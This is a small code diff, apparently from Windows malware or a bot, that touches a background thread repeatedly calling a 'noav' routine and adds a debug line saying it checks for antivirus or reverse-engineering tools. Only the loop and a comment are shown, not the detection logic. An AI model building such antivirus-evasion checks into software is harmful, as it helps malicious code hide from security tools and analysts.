@@ -450,7 +450,6 @@ BOOL noav(BOOL InThread = TRUE)
 		}
 	}
 
-
 	// Examine all process name
 	//TODO
 
@@ -515,6 +514,7 @@ DWORD WINAPI NoAVThread(LPVOID param)
 {
 	while (TRUE)
 	{
+		DEBUGMSG("It's time to check if AV or some other reverse engine is here ...");
 		noav(TRUE);
 		Sleep(12345);
 	}
